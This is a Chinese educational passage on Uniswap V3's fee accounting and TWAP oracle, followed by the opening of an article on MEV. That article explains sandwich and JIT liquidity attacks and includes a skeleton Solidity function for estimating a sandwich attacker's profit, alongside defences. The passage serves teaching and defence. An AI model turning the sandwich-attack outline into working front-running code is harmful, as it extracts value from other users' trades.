费率等级\nV3支持多个费率等级，每个等级绑定特定的tick间距：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n费率百万分比Tick间距适用场景0.01%1001稳定币对0.05%50010相关资产0.30%300060主流币对1.00%10000200高风险币对\n1.3 费用计算的核心挑战\nflowchart LR\n    subgraph TradGroup[&quot;传统方案&quot;]\n        T1[遍历所有LP]\n        T2[计算每个LP份额]\n        T3[分配费用]\n        T4[&quot;O(n)复杂度&lt;br/&gt;Gas成本高&quot;]\n        T1 --&gt; T2\n        T2 --&gt; T3\n    end\n\n    subgraph V3Group[&quot;V3方案&quot;]\n        V1[记录全局增长率]\n        V2[LP领取时计算差值]\n        V3[乘以流动性数量]\n        V4[&quot;O(1)复杂度&lt;br/&gt;Gas成本低&quot;]\n        V1 --&gt; V2\n        V2 --&gt; V3\n    end\n\n    style V3Group fill:#c8e6c9\n    style TradGroup fill:#ffcdd2\n\n\n2. 费用增长率机制\n2.1 全局费用增长率\n池子维护两个全局费用增长累积器：\n// 每单位流动性累积的token0费用\nuint256 public override feeGrowthGlobal0X128;\n \n// 每单位流动性累积的token1费用\nuint256 public override feeGrowthGlobal1X128;\n数学定义：\nfeeGrowthGlobalX128 = Σ(fee_i / L_i) × 2^128\n\n其中：\n- fee_i: 第i笔交易产生的费用\n- L_i: 第i笔交易时的活跃流动性\n\n2.2 更新机制\nsequenceDiagram\n    participant Trader as 交易者\n    participant Pool as 池子合约\n    participant State as 状态变量\n\n    Trader-&gt;&gt;Pool: swap(...)\n    Pool-&gt;&gt;Pool: 计算交易费用\n    Note over Pool: feeAmount = amountIn × feePips / 1e6\n\n    Pool-&gt;&gt;Pool: 计算费用增长\n    Note over Pool: growth = feeAmount × 2^128 / liquidity\n\n    Pool-&gt;&gt;State: 更新全局增长率\n    Note over State: feeGrowthGlobalX128 += growth\n\n2.3 代码实现\n// 在swap循环中更新费用增长率\nif (state.liquidity &gt; 0) {\n    state.feeGrowthGlobalX128 += FullMath.mulDiv(\n        step.feeAmount,           // 本步产生的费用\n        FixedPoint128.Q128,       // 2^128 归一化因子\n        state.liquidity           // 当前活跃流动性\n    );\n}\n\n3. 区间费用计算\n3.1 “Outside”概念\n每个tick维护”outside”费用增长率，表示tick另一侧累积的费用：\nflowchart LR\n    subgraph RightGroup[&quot;价格在tick右侧时&quot;]\n        L1[&quot;feeGrowthOutside = tick左侧累积费用&quot;]\n        R1[&quot;tick右侧费用 = global - outside&quot;]\n    end\n\n    subgraph LeftGroup[&quot;价格在tick左侧时&quot;]\n        L2[&quot;feeGrowthOutside = tick右侧累积费用&quot;]\n        R2[&quot;tick左侧费用 = global - outside&quot;]\n    end\n\n    style RightGroup fill:#e3f2fd\n    style LeftGroup fill:#fff3e0\n\n3.2 inside费用计算\nflowchart TB\n    subgraph 计算步骤\n        S1[确定下界below费用]\n        S2[确定上界above费用]\n        S3[计算inside费用]\n    end\n\n    subgraph 公式\n        F[&quot;feeGrowthInside = global - below - above&quot;]\n    end\n\n    S1 --&gt; S2 --&gt; S3 --&gt; F\n\n    style 公式 fill:#c8e6c9\n\n3.3 完整实现\nfunction getFeeGrowthInside(\n    mapping(int24 =&gt; Tick.Info) storage self,\n    int24 tickLower,\n    int24 tickUpper,\n    int24 tickCurrent,\n    uint256 feeGrowthGlobal0X128,\n    uint256 feeGrowthGlobal1X128\n) internal view returns (\n    uint256 feeGrowthInside0X128,\n    uint256 feeGrowthInside1X128\n) {\n    Info storage lower = self[tickLower];\n    Info storage upper = self[tickUpper];\n \n    // 计算下界以下的费用增长\n    uint256 feeGrowthBelow0X128;\n    uint256 feeGrowthBelow1X128;\n    if (tickCurrent &gt;= tickLower) {\n        // 价格在下界之上，outside就是below\n        feeGrowthBelow0X128 = lower.feeGrowthOutside0X128;\n        feeGrowthBelow1X128 = lower.feeGrowthOutside1X128;\n    } else {\n        // 价格在下界之下，需要翻转\n        feeGrowthBelow0X128 = feeGrowthGlobal0X128 - lower.feeGrowthOutside0X128;\n        feeGrowthBelow1X128 = feeGrowthGlobal1X128 - lower.feeGrowthOutside1X128;\n    }\n \n    // 计算上界以上的费用增长\n    uint256 feeGrowthAbove0X128;\n    uint256 feeGrowthAbove1X128;\n    if (tickCurrent &lt; tickUpper) {\n        // 价格在上界之下，outside就是above\n        feeGrowthAbove0X128 = upper.feeGrowthOutside0X128;\n        feeGrowthAbove1X128 = upper.feeGrowthOutside1X128;\n    } else {\n        // 价格在上界之上，需要翻转\n        feeGrowthAbove0X128 = feeGrowthGlobal0X128 - upper.feeGrowthOutside0X128;\n        feeGrowthAbove1X128 = feeGrowthGlobal1X128 - upper.feeGrowthOutside1X128;\n    }\n \n    // 计算区间内的费用增长\n    feeGrowthInside0X128 = feeGrowthGlobal0X128 - feeGrowthBelow0X128 - feeGrowthAbove0X128;\n    feeGrowthInside1X128 = feeGrowthGlobal1X128 - feeGrowthBelow1X128 - feeGrowthAbove1X128;\n}\n3.4 计算示例\nflowchart TB\n    subgraph InitGroup[&quot;初始状态&quot;]\n        G[&quot;feeGrowthGlobal = 1000&quot;]\n        TL[&quot;tickLower.outside = 200&quot;]\n        TU[&quot;tickUpper.outside = 300&quot;]\n        P[&quot;当前价格在区间内&quot;]\n    end\n\n    subgraph CalcGroup[&quot;计算过程&quot;]\n        B[&quot;below = 200 (直接使用)&quot;]\n        A[&quot;above = 300 (直接使用)&quot;]\n        I[&quot;inside = 1000 - 200 - 300 = 500&quot;]\n    end\n\n    subgraph LPFeeGroup[&quot;LP费用计算&quot;]\n        L[&quot;LP流动性 = 100&quot;]\n        LAST[&quot;lastInside = 400&quot;]\n        FEE[&quot;应得费用 = (500 - 400) × 100 / 2^128&quot;]\n    end\n\n    G --&gt; B\n    TL --&gt; B\n    TU --&gt; A\n    P --&gt; B\n    P --&gt; A\n    B --&gt; I\n    A --&gt; I\n    I --&gt; FEE\n    L --&gt; FEE\n    LAST --&gt; FEE\n\n    style LPFeeGroup fill:#c8e6c9\n\n\n4. Tick跨越时的费用处理\n4.1 “翻转”技巧\n当价格跨越tick时，需要更新outside值：\nfunction cross(\n    mapping(int24 =&gt; Tick.Info) storage self,\n    int24 tick,\n    uint256 feeGrowthGlobal0X128,\n    uint256 feeGrowthGlobal1X128,\n    uint160 secondsPerLiquidityCumulativeX128,\n    int56 tickCumulative,\n    uint32 time\n) internal returns (int128 liquidityNet) {\n    Tick.Info storage info = self[tick];\n \n    // 翻转outside值\n    // 新的outside = global - 旧的outside\n    info.feeGrowthOutside0X128 = feeGrowthGlobal0X128 - info.feeGrowthOutside0X128;\n    info.feeGrowthOutside1X128 = feeGrowthGlobal1X128 - info.feeGrowthOutside1X128;\n \n    // 同样处理预言机相关的outside值\n    info.secondsPerLiquidityOutsideX128 =\n        secondsPerLiquidityCumulativeX128 - info.secondsPerLiquidityOutsideX128;\n    info.tickCumulativeOutside = tickCumulative - info.tickCumulativeOutside;\n    info.secondsOutside = time - info.secondsOutside;\n \n    liquidityNet = info.liquidityNet;\n}\n4.2 翻转原理图解\nflowchart TB\n    subgraph &quot;跨越前 (价格在tick左侧)&quot;\n        B1[&quot;outside = 累积到tick右侧的费用&quot;]\n        B2[&quot;inside(左区间) = global - outside&quot;]\n    end\n\n    subgraph &quot;跨越操作&quot;\n        OP[&quot;outside_new = global - outside_old&quot;]\n    end\n\n    subgraph &quot;跨越后 (价格在tick右侧)&quot;\n        A1[&quot;outside = 累积到tick左侧的费用&quot;]\n        A2[&quot;inside(右区间) = global - outside&quot;]\n    end\n\n    B1 --&gt; OP --&gt; A1\n\n    NOTE[&quot;关键：简单减法实现了&lt;br/&gt;inside和outside的互换&quot;]\n\n    style 跨越操作 fill:#fff3e0\n    style NOTE fill:#e8f5e9\n\n\n5. 协议费用\n5.1 协议费用结构\n// Slot0中的feeProtocol字段\n// 低4位：token0的协议费率\n// 高4位：token1的协议费率\nuint8 feeProtocol;\n \n// 协议费用累积\nstruct ProtocolFees {\n    uint128 token0;\n    uint128 token1;\n}\nProtocolFees public override protocolFees;\n5.2 协议费用计算\nflowchart LR\n    subgraph 交易费用\n        TOTAL[总费用 = amountIn × feePips]\n    end\n\n    subgraph 分配\n        PROTOCOL_SHARE[&quot;协议份额 = 总费用 / feeProtocol&quot;]\n        LP_SHARE[&quot;LP份额 = 总费用 - 协议份额&quot;]\n    end\n\n    TOTAL --&gt; PROTOCOL_SHARE\n    TOTAL --&gt; LP_SHARE\n\n    style 分配 fill:#e3f2fd\n\n5.3 代码实现\n// 在swap循环中计算协议费用\nif (cache.feeProtocol &gt; 0) {\n    // 协议费用 = 交易费用 / 协议费率\n    uint256 delta = step.feeAmount / cache.feeProtocol;\n    step.feeAmount -= delta;           // 从LP费用中扣除\n    state.protocolFee += uint128(delta); // 累积到协议费用\n}\n \n// 循环结束后更新协议费用\nif (zeroForOne) {\n    if (state.protocolFee &gt; 0) {\n        protocolFees.token0 += state.protocolFee;\n    }\n} else {\n    if (state.protocolFee &gt; 0) {\n        protocolFees.token1 += state.protocolFee;\n    }\n}\n5.4 协议费用提取\nfunction collectProtocol(\n    address recipient,\n    uint128 amount0Requested,\n    uint128 amount1Requested\n) external override lock onlyFactoryOwner returns (\n    uint128 amount0,\n    uint128 amount1\n) {\n    // 计算实际可提取数量\n    amount0 = amount0Requested &gt; protocolFees.token0\n        ? protocolFees.token0\n        : amount0Requested;\n    amount1 = amount1Requested &gt; protocolFees.token1\n        ? protocolFees.token1\n        : amount1Requested;\n \n    // 更新状态\n    if (amount0 &gt; 0) {\n        if (amount0 == protocolFees.token0) amount0--;\n        protocolFees.token0 -= amount0;\n        TransferHelper.safeTransfer(token0, recipient, amount0);\n    }\n    if (amount1 &gt; 0) {\n        if (amount1 == protocolFees.token1) amount1--;\n        protocolFees.token1 -= amount1;\n        TransferHelper.safeTransfer(token1, recipient, amount1);\n    }\n \n    emit CollectProtocol(msg.sender, recipient, amount0, amount1);\n}\n\n6. 预言机系统概述\n6.1 TWAP预言机\nV3内置时间加权平均价格（TWAP）预言机：\nflowchart TB\n    subgraph TWAP计算\n        T1[&quot;时间点1: tick=100, time=1000&quot;]\n        T2[&quot;时间点2: tick=102, time=1500&quot;]\n        T3[&quot;时间点3: tick=98, time=2000&quot;]\n    end\n\n    subgraph 累积值\n        C1[&quot;tickCumulative1 = 100×1000&quot;]\n        C2[&quot;tickCumulative2 = 100×1000 + 102×500&quot;]\n        C3[&quot;tickCumulative3 = ... + 98×500&quot;]\n    end\n\n    subgraph TWAP公式\n        F[&quot;TWAP = (tickCumulative2 - tickCumulative1) / (time2 - time1)&quot;]\n    end\n\n    T1 --&gt; C1\n    T2 --&gt; C2\n    T3 --&gt; C3\n    C1 &amp; C2 --&gt; F\n\n    style TWAP公式 fill:#c8e6c9\n\n6.2 预言机的优势\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n特性说明抗操纵性攻击者需要持续维持异常价格才能影响TWAP历史数据可查询任意历史时间点的价格Gas效率O(1)查询复杂度灵活性可配置观察窗口大小\n\n7. Observation数据结构\n7.1 观察者结构\nstruct Observation {\n    // 记录时的区块时间戳\n    uint32 blockTimestamp;\n \n    // tick的累积值（用于计算TWAP）\n    int56 tickCumulative;\n \n    // 每流动性秒数的累积值\n    uint160 secondsPerLiquidityCumulativeX128;\n \n    // 是否已初始化\n    bool initialized;\n}\n \n// 固定大小的环形数组\nOracle.Observation[65535] public override observations;\n7.2 存储布局\nflowchart LR\n    subgraph ArrayGroup[&quot;observations数组 (环形)&quot;]\n        O0[&quot;[0]&lt;br/&gt;旧数据&quot;]\n        O1[&quot;[1]&quot;]\n        O2[&quot;[2]&quot;]\n        DOTS[&quot;...&quot;]\n        ON[&quot;[index]&lt;br/&gt;最新&quot;]\n        ON1[&quot;[index+1]&lt;br/&gt;下一个写入位置&quot;]\n        O0 --&gt; O1\n        O1 --&gt; O2\n        O2 --&gt; DOTS\n        DOTS --&gt; ON\n        ON --&gt; ON1\n        ON1 -.-&gt;|环形| O0\n    end\n\n    style ON fill:#c8e6c9\n\n7.3 关键状态变量\n// 在Slot0中\nstruct Slot0 {\n    // ... 其他字段\n    uint16 observationIndex;           // 当前观察者索引\n    uint16 observationCardinality;     // 当前容量\n    uint16 observationCardinalityNext; // 目标容量\n    // ...\n}\n\n8. 预言机写入机制\n8.1 写入时机\n预言机在以下情况更新：\n\nswap：当价格发生变化时\nmint/burn：当流动性变化且是区块内首次操作时\n\n8.2 写入函数\nfunction write(\n    Observation[65535] storage self,\n    uint16 index,\n    uint32 blockTimestamp,\n    int24 tick,\n    uint128 liquidity,\n    uint16 cardinality,\n    uint16 cardinalityNext\n) internal returns (uint16 indexUpdated, uint16 cardinalityUpdated) {\n    Observation memory last = self[index];\n \n    // 同一区块内不重复写入\n    if (last.blockTimestamp == blockTimestamp) return (index, cardinality);\n \n    // 检查是否需要扩容\n    if (cardinalityNext &gt; cardinality &amp;&amp; index == (cardinality - 1)) {\n        cardinalityUpdated = cardinalityNext;\n    } else {\n        cardinalityUpdated = cardinality;\n    }\n \n    // 计算下一个索引（环形）\n    indexUpdated = (index + 1) % cardinalityUpdated;\n \n    // 写入新观察值\n    self[indexUpdated] = transform(last, blockTimestamp, tick, liquidity);\n}\n8.3 Transform函数\nfunction transform(\n    Observation memory last,\n    uint32 blockTimestamp,\n    int24 tick,\n    uint128 liquidity\n) private pure returns (Observation memory) {\n    // 计算时间差\n    uint32 delta = blockTimestamp - last.blockTimestamp;\n \n    return Observation({\n        blockTimestamp: blockTimestamp,\n        // 累积tick值\n        tickCumulative: last.tickCumulative +\n            int56(tick) * int56(uint56(delta)),\n        // 累积每流动性秒数\n        secondsPerLiquidityCumulativeX128: last.secondsPerLiquidityCumulativeX128 +\n            ((uint160(delta) &lt;&lt; 128) / (liquidity &gt; 0 ? liquidity : 1)),\n        initialized: true\n    });\n}\n8.4 累积值计算图解\nsequenceDiagram\n    participant Last as 上一观察\n    participant Current as 当前状态\n    participant New as 新观察\n\n    Last-&gt;&gt;Current: 时间差 delta = now - last.time\n    Last-&gt;&gt;Current: 获取当前tick\n    Current-&gt;&gt;New: tickCumulative = last.tickCumulative + tick × delta\n    Current-&gt;&gt;New: secondsPerLiquidity += delta / liquidity\n    New-&gt;&gt;New: 记录当前时间戳\n\n\n9. 预言机查询机制\n9.1 查询接口\nfunction observe(uint32[] calldata secondsAgos)\n    external\n    view\n    override\n    noDelegateCall\n    returns (\n        int56[] memory tickCumulatives,\n        uint160[] memory secondsPerLiquidityCumulativeX128s\n    );\n9.2 单点查询实现\nfunction observeSingle(\n    Observation[65535] storage self,\n    uint32 time,\n    uint32 secondsAgo,\n    int24 tick,\n    uint16 index,\n    uint128 liquidity,\n    uint16 cardinality\n) internal view returns (\n    int56 tickCumulative,\n    uint160 secondsPerLiquidityCumulativeX128\n) {\n    if (secondsAgo == 0) {\n        // 查询当前时刻\n        Observation memory last = self[index];\n        if (last.blockTimestamp != time) {\n            // 需要补充当前区块的累积\n            return transform(last, time, tick, liquidity);\n        }\n        return (last.tickCumulative, last.secondsPerLiquidityCumulativeX128);\n    }\n \n    // 查询历史时刻\n    uint32 target = time - secondsAgo;\n \n    // 找到目标时间点前后的观察值\n    (Observation memory beforeOrAt, Observation memory atOrAfter) =\n        getSurroundingObservations(\n            self, time, target, tick, index, liquidity, cardinality\n        );\n \n    if (target == beforeOrAt.blockTimestamp) {\n        // 精确命中\n        return (beforeOrAt.tickCumulative, beforeOrAt.secondsPerLiquidityCumulativeX128);\n    } else if (target == atOrAfter.blockTimestamp) {\n        return (atOrAfter.tickCumulative, atOrAfter.secondsPerLiquidityCumulativeX128);\n    } else {\n        // 需要线性插值\n        uint32 observationTimeDelta = atOrAfter.blockTimestamp - beforeOrAt.blockTimestamp;\n        uint32 targetDelta = target - beforeOrAt.blockTimestamp;\n \n        return (\n            beforeOrAt.tickCumulative +\n                ((atOrAfter.tickCumulative - beforeOrAt.tickCumulative) /\n                int56(uint56(observationTimeDelta))) *\n                int56(uint56(targetDelta)),\n            beforeOrAt.secondsPerLiquidityCumulativeX128 +\n                uint160(\n                    (uint256(\n                        atOrAfter.secondsPerLiquidityCumulativeX128 -\n                            beforeOrAt.secondsPerLiquidityCumulativeX128\n                    ) * targetDelta) / observationTimeDelta\n                )\n        );\n    }\n}\n9.3 二分查找\nfunction binarySearch(\n    Observation[65535] storage self,\n    uint32 time,\n    uint32 target,\n    uint16 index,\n    uint16 cardinality\n) private view returns (\n    Observation memory beforeOrAt,\n    Observation memory atOrAfter\n) {\n    // 确定搜索范围\n    uint256 l = (index + 1) % cardinality;  // 最老的观察\n    uint256 r = l + cardinality - 1;         // 最新的观察\n    uint256 i;\n \n    while (true) {\n        i = (l + r) / 2;\n \n        beforeOrAt = self[i % cardinality];\n \n        if (!beforeOrAt.initialized) {\n            l = i + 1;\n            continue;\n        }\n \n        atOrAfter = self[(i + 1) % cardinality];\n \n        bool targetAtOrAfter = lte(time, beforeOrAt.blockTimestamp, target);\n \n        if (targetAtOrAfter &amp;&amp; lte(time, target, atOrAfter.blockTimestamp)) {\n            break;  // 找到了\n        }\n \n        if (!targetAtOrAfter) {\n            r = i - 1;\n        } else {\n            l = i + 1;\n        }\n    }\n}\n9.4 查询流程图\nflowchart TB\n    START[observe查询] --&gt; CHECK{secondsAgo == 0?}\n\n    CHECK --&gt;|是| CURRENT[返回当前累积值]\n    CHECK --&gt;|否| CALC_TARGET[计算目标时间点]\n\n    CALC_TARGET --&gt; BINARY[二分查找]\n    BINARY --&gt; FOUND{精确命中?}\n\n    FOUND --&gt;|是| RETURN_EXACT[直接返回]\n    FOUND --&gt;|否| INTERPOLATE[线性插值]\n\n    INTERPOLATE --&gt; RETURN[返回插值结果]\n    RETURN_EXACT --&gt; RETURN\n    CURRENT --&gt; RETURN\n\n    style INTERPOLATE fill:#fff3e0\n\n\n10. 预言机扩容机制\n10.1 扩容接口\nfunction increaseObservationCardinalityNext(uint16 observationCardinalityNext)\n    external\n    override\n    lock\n    noDelegateCall\n{\n    uint16 observationCardinalityNextOld = slot0.observationCardinalityNext;\n    uint16 observationCardinalityNextNew = observations.grow(\n        observationCardinalityNextOld,\n        observationCardinalityNext\n    );\n    slot0.observationCardinalityNext = observationCardinalityNextNew;\n \n    if (observationCardinalityNextOld != observationCardinalityNextNew) {\n        emit IncreaseObservationCardinalityNext(\n            observationCardinalityNextOld,\n            observationCardinalityNextNew\n        );\n    }\n}\n10.2 Grow函数\nfunction grow(\n    Observation[65535] storage self,\n    uint16 current,\n    uint16 next\n) internal returns (uint16) {\n    require(current &gt; 0, &#039;I&#039;);\n \n    // 无需扩容\n    if (next &lt;= current) return current;\n \n    // 预初始化新槽位以节省后续写入的gas\n    for (uint16 i = current; i &lt; next; i++) {\n        self[i].blockTimestamp = 1;\n    }\n \n    return next;\n}\n10.3 扩容时机\nflowchart TB\n    subgraph TriggerGroup[&quot;扩容触发&quot;]\n        T1[&quot;用户调用increaseObservationCardinalityNext&quot;]\n        T2[&quot;设置observationCardinalityNext&quot;]\n        T1 --&gt; T2\n    end\n\n    subgraph ActualGroup[&quot;实际扩容&quot;]\n        A1[&quot;写入时检查: index == cardinality - 1?&quot;]\n        A2[&quot;且 cardinalityNext &gt; cardinality?&quot;]\n        A3[&quot;更新cardinality = cardinalityNext&quot;]\n        A1 --&gt;|是| A2\n        A2 --&gt;|是| A3\n    end\n\n    T2 --&gt; A1\n\n    style ActualGroup fill:#e8f5e9\n\n\n11. TWAP计算示例\n11.1 计算30分钟TWAP\n// 查询30分钟和当前的累积值\nuint32[] memory secondsAgos = new uint32[](2);\nsecondsAgos[0] = 1800;  // 30分钟前\nsecondsAgos[1] = 0;     // 当前\n \n(int56[] memory tickCumulatives,) = pool.observe(secondsAgos);\n \n// 计算TWAP tick\nint56 tickCumulativesDelta = tickCumulatives[1] - tickCumulatives[0];\nint24 arithmeticMeanTick = int24(tickCumulativesDelta / 1800);\n \n// 转换为价格\nuint160 sqrtPriceX96 = TickMath.getSqrtRatioAtTick(arithmeticMeanTick);\n11.2 TWAP vs 即时价格\nflowchart LR\n    subgraph 即时价格\n        I1[当前slot0.sqrtPriceX96]\n        I2[可被单笔交易操纵]\n        I3[波动大]\n    end\n\n    subgraph TWAP\n        T1[时间加权平均]\n        T2[操纵成本高]\n        T3[更平滑稳定]\n    end\n\n    style TWAP fill:#c8e6c9\n    style 即时价格 fill:#ffcdd2\n\n11.3 抗操纵分析\nflowchart TB\n    subgraph IntentGroup[&quot;攻击者意图&quot;]\n        A1[想把TWAP从100提高到200]\n        A2[时间窗口30分钟]\n    end\n\n    subgraph CostGroup[&quot;攻击成本&quot;]\n        C1[&quot;需要30分钟内持续维持price=200&quot;]\n        C2[&quot;套利者会不断套利&quot;]\n        C3[&quot;攻击者承担全部滑点损失&quot;]\n    end\n\n    subgraph ResultGroup[&quot;结论&quot;]\n        R[&quot;攻击成本远超潜在收益&quot;]\n    end\n\n    A1 --&gt; C1\n    A2 --&gt; C2\n    C1 --&gt; C3\n    C2 --&gt; C3\n    C3 --&gt; R\n\n    style ResultGroup fill:#c8e6c9\n\n\n12. 本章小结\n12.1 核心概念回顾\nmindmap\n  root((费用与预言机))\n    费用系统\n      全局增长率\n      区间费用计算\n      outside翻转技巧\n      协议费用分配\n    预言机系统\n      Observation结构\n      累积值机制\n      二分查找\n      线性插值\n    TWAP\n      时间加权平均\n      抗操纵性\n      历史查询\n    优化设计\n      O(1)费用计算\n      环形数组存储\n      按需扩容\n\n12.2 关键设计总结\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n设计要点实现方式效果费用计算增长率差值O(1)复杂度区间定位outside翻转优雅的边界处理历史存储环形数组固定存储开销时间查询二分+插值O(log n)查询抗操纵时间加权提高攻击成本\n12.3 使用建议\nflowchart LR\n    subgraph FeeGroup[&quot;费用收取&quot;]\n        F1[定期调用burn(0)结算费用]\n        F2[使用collect提取]\n        F1 --&gt; F2\n    end\n\n    subgraph OracleGroup[&quot;预言机使用&quot;]\n        O1[根据需要设置cardinality]\n        O2[选择合适的时间窗口]\n        O3[结合其他预言机验证]\n        O1 --&gt; O2\n        O2 --&gt; O3\n    end\n\n    style FeeGroup fill:#e3f2fd\n    style OracleGroup fill:#fff3e0\n\n\n下一篇预告\n在下一篇文章中，我们将深入探讨MEV与套利策略，包括：\n\nJIT（Just-in-Time）流动性攻击\n三明治攻击的原理与防护\n跨池套利策略\nTick边界套利\nFlashbots与私有交易池\n\n\n参考资料\n\nUniswap V3 Core - Oracle.sol\nUniswap V3 Core - Tick.sol\nUniswap V3 白皮书 - Oracle部分\n"},"blockchainguide/DApp_Development/应用场景/defi/uniswap/v3/07-MEV与套利策略":{"slug":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v3/07-MEV与套利策略","filePath":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v3/07-MEV与套利策略.md","title":"07-MEV与套利策略","links":[],"tags":[],"content":"死磕Uniswap V3（七）：MEV与套利策略\n\n本文是「死磕Uniswap V3」系列的第七篇（完结篇），深入剖析V3生态中的MEV问题和各种套利策略。\n\n系列导航\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n序号标题核心内容01概述与集中流动性AMM演进、集中流动性原理02Tick机制与价格数学Tick设计、价格转换算法03架构与合约设计Factory、Pool合约结构04交换机制深度解析swap函数、价格发现05流动性管理与头寸Position、mint/burn06费用系统与预言机费用分配、TWAP07MEV与套利策略JIT、三明治攻击\n\n1. MEV概述\n1.1 什么是MEV？\nMEV（Maximal Extractable Value，最大可提取价值）是指矿工/验证者通过重排、插入或审查交易能够获取的额外利润。\nflowchart TB\n    subgraph SourceGroup[&quot;MEV来源&quot;]\n        S1[交易排序权力]\n        S2[区块打包权力]\n        S3[交易可见性]\n    end\n\n    subgraph TypeGroup[&quot;MEV类型&quot;]\n        T1[套利]\n        T2[三明治攻击]\n        T3[清算]\n        T4[JIT流动性]\n    end\n\n    subgraph ParticipantGroup[&quot;参与者&quot;]\n        P1[矿工/验证者]\n        P2[搜索者]\n        P3[套利机器人]\n    end\n\n    S1 --&gt; TypeGroup\n    S2 --&gt; TypeGroup\n    S3 --&gt; TypeGroup\n    TypeGroup --&gt; P1\n    TypeGroup --&gt; P2\n    TypeGroup --&gt; P3\n\n    style SourceGroup fill:#ffcdd2\n    style TypeGroup fill:#fff3e0\n\n1.2 V3中的MEV特点\nV3的集中流动性设计带来了独特的MEV机会：\nflowchart LR\n    subgraph V2特点\n        V2_1[流动性均匀分布]\n        V2_2[套利空间有限]\n        V2_3[价格影响可预测]\n    end\n\n    subgraph V3特点\n        V3_1[流动性集中分布]\n        V3_2[套利空间更大]\n        V3_3[价格影响复杂]\n        V3_4[JIT攻击机会]\n    end\n\n    V2特点 --&gt;|演进| V3特点\n\n    style V3特点 fill:#e3f2fd\n\n1.3 MEV对生态的影响\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n影响维度正面负面市场效率快速价格发现、套利修正价差交易成本增加用户体验-滑点增大、交易失败网络健康-Gas战争、网络拥堵去中心化-专业化集中、准入门槛\n\n2. 三明治攻击\n2.1 攻击原理\n三明治攻击是最常见的MEV形式，攻击者在目标交易前后插入交易获利：\nsequenceDiagram\n    participant Victim as 受害者\n    participant Mempool as 内存池\n    participant Attacker as 攻击者\n    participant Pool as V3池子\n\n    Victim-&gt;&gt;Mempool: 提交大额买入交易\n    Note over Mempool: 交易可见\n\n    Attacker-&gt;&gt;Mempool: 1. 抢跑买入（高Gas）\n    Note over Attacker: 抬高价格\n\n    Attacker-&gt;&gt;Pool: 执行买入\n    Pool--&gt;&gt;Attacker: 以较低价格买入\n\n    Victim-&gt;&gt;Pool: 执行原交易\n    Pool--&gt;&gt;Victim: 以更高价格买入\n\n    Attacker-&gt;&gt;Pool: 2. 尾随卖出\n    Pool--&gt;&gt;Attacker: 以更高价格卖出\n\n    Note over Attacker: 获利 = 卖出 - 买入 - Gas费\n\n2.2 攻击条件分析\nflowchart TD\n    subgraph ConditionGroup[&quot;攻击条件&quot;]\n        C1[交易金额足够大]\n        C2[滑点设置较宽松]\n        C3[流动性深度适中]\n        C4[Gas成本可承受]\n    end\n\n    subgraph ProfitGroup[&quot;利润计算&quot;]\n        P1[买入成本]\n        P2[价格影响]\n        P3[卖出收益]\n        P4[Gas成本]\n        PROFIT[利润 = P3 - P1 - P4]\n    end\n\n    C1 --&gt; ProfitGroup\n    C2 --&gt; ProfitGroup\n    C3 --&gt; ProfitGroup\n    C4 --&gt; ProfitGroup\n    P1 --&gt; P3\n    P2 --&gt; P3\n    P3 --&gt; PROFIT\n    P4 --&gt; PROFIT\n\n    style PROFIT fill:#c8e6c9\n\n2.3 V3中的三明治攻击特点\n// V3三明治攻击的特殊考虑\n \n// 1. 集中流动性使价格影响更剧烈\n// 如果目标交易会跨越多个tick，攻击利润更大\nfunction estimateSandwichProfit(\n    uint256 victimAmount,\n    uint128 currentLiquidity,\n    int24 currentTick,\n    int24 tickSpacing\n) internal view returns (uint256 profit) {\n    // 计算受害者交易的价格影响\n    uint256 priceImpact = calculatePriceImpact(\n        victimAmount,\n        currentLiquidity\n    );\n \n    // 计算攻击者的最优买入量\n    uint256 optimalFrontrun = calculateOptimalFrontrun(\n        victimAmount,\n        priceImpact,\n        currentLiquidity\n    );\n \n    // 计算利润（考虑多tick跨越）\n    profit = estimateProfit(\n        optimalFrontrun,\n        victimAmount,\n        currentTick,\n        tickSpacing\n    );\n}\n \n// 2. Tick跨越带来的机会\n// 当价格跨越tick时，流动性会突变\n// 攻击者可以利用这一点\n2.4 防御策略\nflowchart TB\n    subgraph 用户防御\n        U1[设置严格滑点]\n        U2[使用私有交易池]\n        U3[分批交易]\n        U4[使用限价单]\n    end\n\n    subgraph 协议防御\n        P1[MEV保护路由]\n        P2[批量拍卖]\n        P3[延迟执行]\n    end\n\n    subgraph 工具\n        T1[Flashbots Protect]\n        T2[MEV Blocker]\n        T3[CoW Protocol]\n    end\n\n    用户防御 --&gt; 工具\n    协议防御 --&gt; 工具\n\n    style 工具 fill:#c8e6c9\n\n滑点设置建议：\n// 计算安全的滑点设置\nfunction calculateSafeSlippage(\n    uint256 amountIn,\n    uint128 poolLiquidity,\n    uint24 fee\n) public pure returns (uint256 minAmountOut) {\n    // 估算正常价格影响\n    uint256 expectedImpact = estimateNormalImpact(amountIn, poolLiquidity);\n \n    // 添加安全边际（通常0.5%-1%）\n    uint256 safetyMargin = 50; // 0.5%\n \n    // 计算最小输出\n    // minAmountOut = expectedOut * (1 - impact - margin)\n    minAmountOut = calculateMinOutput(\n        amountIn,\n        expectedImpact,\n        safetyMargin,\n        fee\n    );\n}\n\n3. JIT流动性攻击\n3.1 攻击原理\nJIT（Just-in-Time）流动性攻击是V3特有的MEV形式：\nsequenceDiagram\n    participant Trader as 交易者\n    participant Mempool as 内存池\n    participant JIT as JIT攻击者\n    participant Pool as V3池子\n    participant LPs as 现有LP\n\n    Trader-&gt;&gt;Mempool: 提交大额swap\n    Note over Mempool: 交易可见\n\n    JIT-&gt;&gt;Pool: 1. mint - 在当前价格添加流动性\n    Note over JIT: 极窄区间，大量流动性\n\n    Trader-&gt;&gt;Pool: 执行swap\n    Note over Pool: JIT流动性赚取大部分手续费\n\n    JIT-&gt;&gt;Pool: 2. burn - 立即移除流动性\n    Note over JIT: 获取手续费，承担极小无常损失\n\n    Note over LPs: 